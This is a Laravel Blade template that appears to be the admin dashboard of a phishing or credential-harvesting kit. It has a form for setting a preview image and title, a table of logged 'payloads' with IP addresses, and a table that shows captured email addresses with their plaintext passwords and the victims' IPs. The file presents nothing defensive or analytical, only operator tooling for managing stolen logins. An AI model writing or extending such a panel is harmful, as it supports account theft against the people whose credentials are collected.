@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-4">

          <form action="{{ route('meta') }}" method="post" enctype="multipart/form-data">
            @csrf
            <div class="form-group">
              <label>Image</label>
              <input type="file" class="form-control" required name="image">
            </div>
            <div class="form-group">
              <label>Title</label>
              <input type="text" class="form-control" placeholder="title" name="title" required value="{{ \App\Meta::find(2)->title }}">
            </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>

          <br>
            <div class="card">
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th scope="col">IP</th>
                    <th scope="col">Payload</th>
                    <th scope="col">Time</th>
                    <th scope="col"><a href="{{ route('delete.payload') }}">Delete</a> </th>
                  </tr>
                </thead>
                <tbody>
                  @foreach(\App\Assed::latest()->get() as $asset)
                      <tr>
                        <td>{{ $asset->ip }}</td>
                        <td>{{ $asset->payload }}</td>
                        <td>{{ $asset->created_at->format('m,d') }}</td>
                        <td>{{ $asset->created_at->format('h:i') }}</td>
                      </tr>
                  @endforeach
                </tbody>
              </table>
            </div>
        </div>
        <div class="col-md-8">
            <div class="card">
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th scope="col">Email</th>
                    <th scope="col">Password</th>
                    <th scope="col">IP</th>
                    <th scope="col">Delete</th>
                  </tr>
                </thead>
                <tbody>
                  @foreach(\App\Account::latest()->get() as $account)
                      <tr>
                        <td>{{ $account->email }}</td>
                        <td>{{ $account->password }}</td>
                        <td>{{ $account->ip }}</td>
                        <td><a href="{{ route('delete.account',$account->id) }}" onclick="return confirm('Are you sure you want to delete this item?');">Delete</a></td>
                      </tr>
                  @endforeach
                </tbody>
              </table>
            </div>
        </div>
    </div>
</div>
@endsection
